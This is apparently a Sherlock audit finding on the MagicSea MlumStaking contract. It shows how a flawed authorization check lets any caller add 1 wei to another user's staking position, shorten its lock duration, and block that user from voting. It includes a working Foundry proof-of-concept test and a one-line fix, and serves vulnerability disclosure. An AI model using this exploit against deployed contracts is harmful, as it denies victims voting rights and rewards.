Muscular Pearl Sparrow

Medium

# Attacker can manipulate the `lockDuration` of other users positions

## Summary
The `_requireOnlyOperatorOrOwnerOf` check in `addToPosition` can be bypassed, allowing attackers to manipulate the `lockDuration` of other users positions, impacting voting eligibility and preventing users from participating in voting and earning rewards.

## Vulnerability Detail
The [`_requireOnlyOperatorOrOwnerOf`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L398) check in `addToPosition` ensures that the caller is either the owner or the operator of the tokenId:
```solidity
    function addToPosition(uint256 tokenId, uint256 amountToAdd) external override nonReentrant {
        _requireOnlyOperatorOrOwnerOf(tokenId);
```
The `_requireOnlyOperatorOrOwnerOf` function performs this verification by calling [`ERC721Upgradeable._isAuthorized`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L142) with `msg.sender` as both the `owner` and `spender`:
```solidity
    function _requireOnlyOperatorOrOwnerOf(uint256 tokenId) internal view {
        // isApprovedOrOwner: caller has no rights on token
        require(ERC721Upgradeable._isAuthorized(msg.sender, msg.sender, tokenId), "FORBIDDEN");
    }
```
Since `_isAuthorized` returns `true` when `owner == spender`, this check always evaluates to `true` regardless of the caller's identity:
```solidity
    function _isAuthorized(address owner, address spender, uint256 tokenId) internal view virtual returns (bool) {
        return
            spender != address(0) &&
            (owner == spender || isApprovedForAll(owner, spender) || _getApproved(tokenId) == spender);
    }
```
Any function implementing this check is vulnerable to bypass, but currently only `addToPosition` is affected.
An attack scenario involves an attacker manipulating the `lockDuration` of another user's position by donating a small amount (1 wei).
When users create a position, `lockDuration` dictates how long their asset is locked. This duration impacts rewards, voting eligibility, etc. If an attacker increases another user's position via `addToPosition`, the function [recalculates `lockDuration`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L409) based on new `amountToAdd` and existing lock times:
```solidity
        // we calculate the avg lock time:
        // lock_duration = (remainin_lock_time * staked_amount + amount_to_add * inital_lock_duration) / (staked_amount + amount_to_add)
        uint256 remainingLockTime = _remainingLockTime(position);
        uint256 avgDuration = (remainingLockTime * position.amount + amountToAdd * position.initialLockDuration)
            / (position.amount + amountToAdd);
```
```solidity
    function _remainingLockTime(StakingPosition memory position) internal view returns (uint256) {
        if ((position.startLockTime + position.lockDuration) <= _currentBlockTimestamp()) {
            return 0;
        }
        return (position.startLockTime + position.lockDuration) - _currentBlockTimestamp();
    }
```
A malicious user can call `addToPosition` and donate 1 wei to a position, thereby manipulating the lockDuration of that position, which will have multiple consequences for the victim.

- Alice creates a position with 100e18 as `amount` and 2 weeks as `lockDuration`.
- 1 week later the Admin starts a new voting period.
- Given that Alice's position's `lockDuration` is equal to the `PeriodDuration`, which is 2 weeks, she is eligible to participate in voting.
- Bob (a malicious actor) calls the `addToPosition` and donate 1 wei to Alice's position
- Alice's `lockDuration` is recalculated, potentially reducing it to 1 week.
- Alice calls the `vote` but her transaction reverts due to `InsufficientLockTime` error.

> **_NOTE:_**  There's no need to front-run Alice's transaction because whenever Bob performs this malicious `addToPosition`, the `lockDuration` of Alice's position will be manipulated. All that Bob needs to do is execute this action before Alice calls the vote, and it doesn't have to be immediately preceding Alice's transaction.

### Coded PoC
Above scenario is implemented in this test
Please make a file named `Ninja.t.sol` in this path: `/test/` and paste the following test code in it:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import {ERC20Mock} from "./mocks/ERC20.sol";
import {MasterChefMock} from "./mocks/MasterChefMock.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import "../src/Voter.sol";
import {IVoter} from "../src/interfaces/IVoter.sol";
import "../src/interfaces/IBribeRewarder.sol";
import "../src/rewarders/BribeRewarder.sol";
import "../src/rewarders/RewarderFactory.sol";

contract Ninja is Test {
    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));

    address pool = makeAddr("pool");

    Voter private _voter;
    MlumStaking private _pool;

    ERC20Mock private _stakingToken;
    ERC20Mock private _rewardToken;
    ERC20Mock private _bribeRewardToken;

    BribeRewarder rewarder;
    RewarderFactory factory;

    function setUp() public {
        _bribeRewardToken = new ERC20Mock("Reward Token", "RT", 6);

        vm.prank(DEV);
        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        _rewardToken = new ERC20Mock("USDT", "USDT", 6);

        vm.prank(DEV);
        address poolImpl = address(new MlumStaking(_stakingToken, _rewardToken));

        _pool = MlumStaking(
            address(
                new TransparentUpgradeableProxy2Step(
                    poolImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );

        vm.prank(DEV);
        MasterChefMock mock = new MasterChefMock();

        address factoryImpl = address(new RewarderFactory());
        factory = RewarderFactory(
            address(
                new TransparentUpgradeableProxy2Step(
                    factoryImpl,
                    ProxyAdmin2Step(address(1)),
                    abi.encodeWithSelector(
                        RewarderFactory.initialize.selector, address(this), new uint8[](0), new address[](0)
                    )
                )
            )
        );
        address voterImpl = address(new Voter(mock, _pool, IRewarderFactory(address(factory))));

        _voter = Voter(
            address(
                new TransparentUpgradeableProxy2Step(
                    voterImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(Voter.initialize.selector, DEV)
                )
            )
        );

        factory.setRewarderImplementation(
            IRewarderFactory.RewarderType.BribeRewarder, IRewarder(address(new BribeRewarder(address(_voter))))
        );
        rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(_bribeRewardToken, pool))));

        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);
    }

    function test_MaliciousAddToPosition() public {
        IMlumStaking.StakingPosition memory position;

        _createPosition(ALICE, 100 ether, 2 weeks);
        assertEq(_pool.ownerOf(1), ALICE);

        _stakingToken.mint(BOB, 1 wei);

        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 2 weeks);
        assertEq(_remainingLockTime(position), 2 weeks);

        console.log("%s%s", "lockDuration Before Malicious addToPosition: ", position.lockDuration);

        skip(1 weeks);
        // 1 week later the Admin starts a voting period
        vm.prank(DEV);
        _voter.startNewVotingPeriod();
        assertEq(1, _voter.getCurrentVotingPeriod());

        // Alice is eligible to Vote because her position's lockDuration is = to the duration of the period
        // 2 weeks == 2 weeks
        assertEq(position.lockDuration, _voter.getPeriodDuration());

        // Bob maliciously adds 1 wei to Alice's position which will update her position and decreases her lockDuration
        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 1 wei);
        _pool.addToPosition(1, 1 wei);
        vm.stopPrank();

        // Alice will lose her eligibility due to the lockDuration decrease that occurred after Bob maliciously added 1 wei to her position.
        // Now Alice's lockDuration is 1 week, which is less than the PeriodDuration which 2 weeks.
        position = _pool.getStakingPosition(1);
        assertLt(position.lockDuration, _voter.getPeriodDuration());
        assertEq(position.lockDuration, 1 weeks);
    
        console.log("%s%s", "lockDuration After Malicious addToPosition:  ", position.lockDuration);

        // Alice calls the vote function but her tx reverts due to the InsufficientLockTime error
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(
                IVoter.IVoter__InsufficientLockTime.selector
            )
        );
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
    }

    /*
    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ||||||||||||||||||||||||| INTERNAL FUNCTIONS |||||||||||||||||||||||||||||
    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    */

    function _createPosition(address user, uint256 amount, uint256 duration) internal {
        _stakingToken.mint(user, 100 ether);

        vm.startPrank(user);
        _stakingToken.approve(address(_pool), amount);
        _pool.createPosition(amount, duration);
        vm.stopPrank();
    }

    function _getDeltaAmounts() internal pure returns (uint256[] memory deltaAmounts) {
        deltaAmounts = new uint256[](1);
        deltaAmounts[0] = 1e18;
    }

    function _getDummyPools() internal view returns (address[] memory pools) {
        pools = new address[](1);
        pools[0] = pool;
    }

    function _remainingLockTime(IMlumStaking.StakingPosition memory position) internal view returns (uint256) {
        if ((position.startLockTime + position.lockDuration) <= _currentBlockTimestamp()) {
            return 0;
        }
        return (position.startLockTime + position.lockDuration) - _currentBlockTimestamp();
    }

    function _currentBlockTimestamp() internal view virtual returns (uint256) {
        return block.timestamp;
    }
}
```
Run the test:
```bash
forge test --mt test_MaliciousAddToPosition -vv
```

Output:
```bash
Compiler run successful!

Ran 1 test for test/Ninja.t.sol:Ninja
[PASS] test_MaliciousAddToPosition() (gas: 624706)
Logs:
  lockDuration Before Malicious addToPosition: 1209600
  lockDuration After Malicious addToPosition:  604800

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.64ms (340.63µs CPU time)
```
## Impact
This bug has multiple impacts on rewards calculation, voting eligibility, etc., as highlighted in this report, particularly preventing users from participating in voting, thereby denying them access to rewards.

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L398
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L142
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L409
## Tool used

Manual Review

## Recommendation
```diff
    function _requireOnlyOperatorOrOwnerOf(uint256 tokenId) internal view {
        // isApprovedOrOwner: caller has no rights on token
-       require(ERC721Upgradeable._isAuthorized(msg.sender, msg.sender, tokenId), "FORBIDDEN");
+       require(ERC721Upgradeable._isAuthorized(ownerOf(tokenId), msg.sender, tokenId), "FORBIDDEN");
    }
```